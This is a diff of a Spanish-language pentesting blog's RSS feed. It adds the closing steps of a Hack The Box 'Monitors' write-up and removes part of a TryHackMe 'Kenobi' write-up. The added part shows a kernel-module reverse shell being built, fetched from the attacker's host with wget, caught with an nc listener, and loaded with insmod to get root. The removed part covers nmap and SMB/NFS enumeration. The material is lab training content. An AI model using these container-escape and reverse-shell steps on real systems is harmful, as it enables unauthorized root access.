+&lt;span class=&quot;nl&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	make &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; /lib/modules/&lt;span class=&quot;p&quot;&gt;$(&lt;/span&gt;shell &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;/build &lt;span class=&quot;nv&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$(&lt;/span&gt;PWD&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; modules
+
+&lt;span class=&quot;nl&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+	make &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; /lib/modules/&lt;span class=&quot;p&quot;&gt;$(&lt;/span&gt;shell &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;/build &lt;span class=&quot;nv&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;$(&lt;/span&gt;PWD&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; clean
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Este &lt;em&gt;Makefile&lt;/em&gt; crea el archivo binario del módulo (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse-shell.ko&lt;/code&gt;) usando el código fuente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse-shell.c&lt;/code&gt;. La línea &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules&lt;/code&gt; le indica al compilador que use la versión del &lt;em&gt;kernel&lt;/em&gt; activa en el sistema anfitrión para crear el módulo. El comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make clean&lt;/code&gt; elimina cualquier archivo generado en la compilación, manteniendo el entorno limpio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/63.png&quot; alt=&quot;63&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nuevamente, hostearemos un servidor en nuestra máquina atacante usando &lt;em&gt;Python&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 -m http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Desde el contenedor, descargaremos los dos archivos que acabamos de crear usando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://&amp;lt;nuestraIP&amp;gt;:80/reverse-shell.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://&amp;lt;nuestraIP&amp;gt;:80/Makefile
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/64.png&quot; alt=&quot;64&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Posteriormente, ejecutaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make&lt;/code&gt; para compilar el módulo, lo que generará el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse-shell.ko&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/65.png&quot; alt=&quot;65&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora, nos pondremos en escucha en nuestra máquina de atacante utilizando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt; en el puerto que definimos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse-shell.c&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -nlvp 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finalmente, inyectaremos el módulo en el kernel usando:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;insmod reverse-shell.ko
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Al ejecutar este comando, obtendremos una &lt;em&gt;reverse shell&lt;/em&gt; en la máquina anfitriona, esta vez con privilegios de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, lo que nos permitirá listar la última flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/66.png&quot; alt=&quot;66&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Mon, 11 Nov 2024 00:00:00 -0500</pubDate>
+        <link>/es/Monitors-Hack-The-Box/</link>
+        <guid isPermaLink="true">/es/Monitors-Hack-The-Box/</guid>
+      </item>
+    
+      <item>
         <title>Devel - Hack The Box</title>
         <description>&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-09-30-Devel-Hack-The-Box/1.png&quot; alt=&quot;Info Card&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
@@ -2470,297 +3088,6 @@ cat .bash_history
         <pubDate>Mon, 28 Feb 2022 00:00:00 -0500</pubDate>
         <link>/es/SecNotes-Hack-The-Box/</link>
         <guid isPermaLink="true">/es/SecNotes-Hack-The-Box/</guid>
-      </item>
-    
-      <item>
-        <title>Kenobi - TryHackMe</title>
-        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;em&gt;Kenobi&lt;/em&gt; de &lt;em&gt;TryHackMe&lt;/em&gt;. Esta es una máquina fácil tanto en la intrusión como en la escalada de privilegios, por lo que no supondrá ninguna complicación a la hora de realizarla.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/1.png&quot; alt=&quot;Info Card&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;fase-de-reconocimiento&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Reconocimiento&lt;/h3&gt;
-
-&lt;p&gt;Primeramente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo.&lt;/p&gt;
-
-&lt;p&gt;Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de puertos con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todo el rango de puertos (65535 en total)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Emitir paquetes no más lentos que &amp;lt;valor&amp;gt; por segundo&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, para obtener mayor información por consola&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;No aplicar &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 21,22,80,111,139,445,2049,35049,41843,47869,50933 &amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Scripts básicos de enumeración&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Versión y servicios que corren bajo los puertos encontrados&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Con estos dos escaneos bastaría para responder a dos de las preguntas planteadas:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;¿Cuántos puertos abiertos existen?&lt;/li&gt;
-  &lt;li&gt;¿En qué puerto está corriendo el protocolo FTP?&lt;/li&gt;
-  &lt;li&gt;¿Cuál es la versión del servicio ProFTPD que se está corriendo?&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Para responder a estas dos últimas preguntas solo tenemos que revisar el escaneo de versiones y servicios que realizamos con &lt;em&gt;Nmap&lt;/em&gt;; por otra parte, la primera pregunta tiene algo de trampa, ya que la respuesta correcta es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7&lt;/code&gt; puertos abiertos, mientras que con nuestro escaneo detectamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;11&lt;/code&gt;, ¿qué hicimos mal?&lt;/p&gt;
-
-&lt;p&gt;Nada, lo que sucede es que nosotros al indicar el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p-&lt;/code&gt;, estamos escaneando todo el rango de puertos, si no indicáramos este parámetro, &lt;em&gt;Nmap&lt;/em&gt; escanearía únicamente los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1000&lt;/code&gt; puertos más comunes, por lo que vemos que &lt;em&gt;TryHackMe&lt;/em&gt; no se dio la molestia de escanearlo todo por completo.&lt;/p&gt;
-
-&lt;p&gt;Habiendo aclarado esto, los puertos abiertos más relevantes que encontramos son el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;139&lt;/code&gt; y el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt;, ambos relacionados con el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (Server Message Block), el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111&lt;/code&gt; relacionado con el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcbind&lt;/code&gt;, relacionado a su vez con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt; (Remote Procedure Call), y el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;21&lt;/code&gt; relacionado con el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; (File Transfer Protocol).&lt;/p&gt;
-
-&lt;p&gt;En este punto, &lt;em&gt;TryHackMe&lt;/em&gt; nos sugiere usar el propio &lt;em&gt;Nmap&lt;/em&gt; para enumerar los recursos compartidos a través de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samba&lt;/code&gt;, que si bien podemos hacerlo, optaremos por usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;smbmap&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;SMBMap&lt;/h3&gt;
-
-&lt;p&gt;Para poder listar los recursos compartidos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt;, bastará con indicar la direción IP de la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Lo primero que podemos darnos cuenta es que existen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt; recursos compartidos, de los cuales solo tenemos acceso a uno, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Si decidimos listar de manera recursiva el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;, encontraremos un archivo que lleva por nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, el cual ya levanta nuestras sospechas.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; anonymous
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para poder descargar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, podremos hacerlo usando tanto su ruta absoluta con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--download&lt;/code&gt;, o bien creando patrones mediante &lt;em&gt;expresiones regulares&lt;/em&gt; con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-A&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;--download&lt;/span&gt; anonymous/log.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &amp;lt;dirección IP&amp;gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; anonymous &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; log.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/4.png&quot; alt=&quot;4&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;smbclient&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;smbclient&lt;/h3&gt;
-
-&lt;p&gt;Para poder listar los recursos compartidos haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;smbclient&lt;/code&gt; tendremos que especificar el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-L&lt;/code&gt;, adicional a ello tendremos que indicar que queremos hacer uso de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null session&lt;/code&gt; con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-N&lt;/code&gt;, ya que no conocemos credenciales con las cuales autenticarnos; esto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMBMap&lt;/code&gt; no ocurría ya que por defecto hace uso de un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null session&lt;/code&gt;, a no ser que le indiquemos un usuario y contraseña.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En este caso, no se nos indica los permisos que tenemos sobre los recursos, no obstante, podemos intuir a que recursos tenemos acceso, por ejemplo, el recurso &lt;a href=&quot;https://wiki.samba.org/index.php/Setting_up_Automatic_Printer_Driver_Downloads_for_Windows_Clients#Setting_up_the_.5Bprint.24.5D_Share&quot;&gt;print$&lt;/a&gt; se relaciona con impresoras que se están compartiendo a nivel de red, por otra parte, tenemos el recurso &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session&quot;&gt;IPC$&lt;/a&gt; el cual crea el propio &lt;em&gt;Windows&lt;/em&gt; para poder hacer uso de los &lt;em&gt;null sessions&lt;/em&gt;; de modo que, de los &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3&lt;/code&gt; recursos compartidos existentes, solo nos queda &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Lo siguiente que haremos será listar el contenido que se encuentra dentro del recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;anonymous&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; //dirección IP/anonymous
-&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos observar que dentro existe un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, el cual procederemos a descargar.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; //dirección IP/anonymous
-get log.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Independientemente de como hayamos descargado el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;, al leerlo, lo más importante que encontraremos será la ubicación del par de claves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RSA&lt;/code&gt;, ubicadas en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/kenobi/.ssh&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Adicionalmente, encontraremos información tanto del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ProFTPD&lt;/code&gt;, como del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samba&lt;/code&gt;, pero nada realmente interesante, por lo que estamos omitiendo algo.&lt;/p&gt;
-
-&lt;p&gt;Si recordamos, el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;111&lt;/code&gt;, relacionado con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcbind&lt;/code&gt;, estaba abierto, y lo que nos mostraba nuestro escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;, es que en este puerto está corriendo a su vez el protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFS&lt;/code&gt; (Network File System) en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2049&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;El protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NFS&lt;/code&gt; se utiliza principalmente para acceder a archivos compartidos a nivel de red, de manera local. Comprobemos si se está compartiendo algún recurso que podamos &lt;em&gt;montar&lt;/em&gt; en nuestro equipo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;showmount &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &amp;lt;dirección IP&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
